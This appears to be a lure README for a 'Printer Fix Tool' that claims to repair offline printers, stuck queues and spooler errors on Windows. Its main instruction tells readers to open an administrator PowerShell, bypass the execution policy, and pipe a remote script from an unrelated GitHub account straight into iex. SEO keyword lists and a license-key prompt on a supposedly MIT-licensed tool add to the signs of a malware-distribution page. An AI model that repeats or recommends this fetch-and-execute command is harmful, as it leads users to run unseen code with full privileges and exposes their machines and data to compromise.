# Printer Fix Tool — PowerShell

**Printer-Fix-Tool-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.3.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix printer offline, stuck print queue, spooler errors and driver issues on Windows.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install Printer Fix Tool via PowerShell — fix printer offline, stuck queue and Print Spooler errors on Windows 10/11. HP, Canon, Epson, Brother supported.

## Common Searches

- printer offline but connected
- print jobs stuck in queue
- print spooler keeps stopping
- printer not printing windows 11
- hp printer offline fix

## Features

* **Offline fix** — Resets port and brings printer back online.
* **Queue clear** — Removes stuck jobs and restarts Print Spooler.
* **Spooler repair** — Re-registers spooler service and dependencies.
* **Driver reset** — Reinstalls printer driver without full OS reset.
* **All brands** — HP, Canon, Epson, Brother, Samsung, Xerox and others.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**Printer shows Offline?**
Resets printer port and Windows printer status.

**Print jobs stuck in queue?**
Clears spool folder and restarts Print Spooler service.

**Print Spooler keeps stopping?**
Repairs service registration and dependencies.

**After Windows Update broke printer?**
Reinstalls driver stack and default printer.

---

TAGS printer offline fix, print spooler fix, printer not printing windows 11, stuck print queue, powershell install, windows setup script

## License

[MIT](LICENSE)
